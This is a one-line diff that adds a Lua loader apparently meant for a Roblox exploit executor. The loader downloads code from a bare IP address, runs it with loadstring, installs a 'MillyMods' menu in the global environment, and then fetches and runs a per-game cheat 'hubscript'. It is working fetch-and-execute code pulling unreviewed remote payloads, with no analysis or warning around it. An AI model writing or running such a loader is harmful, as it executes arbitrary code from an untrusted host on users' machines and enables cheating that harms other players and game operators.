@@ -1,0 +1,1 @@
+local function x(u)local s=game:HttpGet(u);local f,e=loadstring(s);if not f then error(e)end;return f()end;local g=getgenv();g.MillyUI=x("http://171.22.31.76:2845/ui.lua");g.MillyMenu=g.MillyUI.new("@MillyMods");local p=game.GameId==4777817887 and 16281300371 or game.PlaceId;return x("http://171.22.31.76:2845/hubscript.lua?placeid="..p)
